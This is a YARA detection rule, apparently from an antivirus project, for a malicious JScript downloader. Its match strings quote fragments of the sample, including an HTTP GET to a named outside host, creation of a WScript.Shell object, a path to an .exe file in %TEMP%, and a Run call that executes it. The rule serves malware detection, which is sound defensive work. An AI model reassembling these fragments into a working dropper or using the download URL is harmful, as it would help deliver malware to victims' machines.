rule sig_20160330_f0308c7619976064927bb4f2adc80e8f {
  meta:
    description = "datamaliciousorder - file 20160330_f0308c7619976064927bb4f2adc80e8f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0b2d07d74490e96870df91b7b289a33f062b2534283df30957f13094e4b1e41d"

  strings:
    $s1  = "_YX[_LS](\"GET\", \"http://smartbs-cameroun.com/nc7sjd\", false);" fullword ascii
    $s2  = "var _K = function _ID() {return WScript[_P1](\"WScript\"+\".Shell\");}(), _D0 = 11;" fullword ascii
    $s3  = "function _E(_E0, _TJ){_KX = _KX * 1; return _E0 - _TJ;};" fullword ascii
    $s4  = "if (_YX[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _HB(){return _OU + \"\";};" fullword ascii
    $s6  = "function _ZA() {return _K[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"id9WRXYh85e.ex\" + \"e\";};" fullword ascii
    $s7  = "function _UN() {return ((_S == true) && (_S == _A1)) ? 1 : _KX;};" fullword ascii
    $s8  = "function _A(_IG){_K[\"Run\"](_IG, _KX, _KX);};" fullword ascii
    $s9  = "var _L = new this[\"Date\"]();" fullword ascii
    $s10 = " while (_B){" fullword ascii
    $s11 = "function _F()" fullword ascii
    $s12 = "function _P0(){return 22;};" fullword ascii
    $s13 = "function _P(_RN) {var _D = (1, 2, 3, 4, 5, _RN); return _D;};" fullword ascii
    $s14 = "return _E(_WO, _TH);" fullword ascii
    $s15 = "function _BW(){return _P1;};" fullword ascii
    $s16 = "var _R = false;" fullword ascii
    $s17 = "var _S = false;" fullword ascii
    $s18 = "_S = true; " fullword ascii
    $s19 = "var _A1 = false;" fullword ascii
    $s20 = "_A1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}